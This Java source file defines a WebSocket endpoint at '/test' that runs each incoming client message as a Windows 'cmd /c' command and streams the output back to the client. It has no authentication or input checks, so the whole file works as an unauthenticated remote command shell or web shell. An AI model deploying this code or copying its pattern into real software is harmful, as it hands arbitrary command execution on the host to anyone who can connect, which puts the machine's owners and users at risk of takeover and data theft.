package server;

import java.io.IOException;
import java.io.InputStream;
import static java.lang.Thread.sleep;
import java.util.logging.Level;
import java.util.logging.Logger;
import javax.websocket.OnClose;
import javax.websocket.OnMessage;
import javax.websocket.OnOpen;
import javax.websocket.Session;
import javax.websocket.server.ServerEndpoint;

@ServerEndpoint("/test")
public class test {

    Session userSession = null;

    @OnOpen
    public void handleOpen(Session userSession) {
        System.out.println("client connected...");
        this.userSession = userSession;
        sendMessage("Welcome");
    }

    @OnClose
    public void handleClose() {
        System.out.println("client disconnected...");
    }

    @OnMessage
    public void onMessage(String message) throws InterruptedException {
        String resultMessage = "";
        if (message != null) {
            System.out.println(message);
            try {
                Process p = Runtime.getRuntime().exec("cmd /c " + message);
                InputStream in = p.getInputStream();

                int c;
                sendMessage("NewCommandReturn");
                while ((c = in.read()) != -1) {
                    resultMessage += (char) c;
                    if(c == 10){
                        sendMessage(resultMessage);
                        resultMessage = "";
                    }
                }
                sendMessage("EndCommandReturn");
            } catch (IOException ex) {
                ex.printStackTrace();
            }
        }
    }

    public void sendMessage(String message) {
        try {
            this.userSession.getBasicRemote().sendText(message);
        } catch (IOException ex) {
            ex.printStackTrace();
        }
    }

}
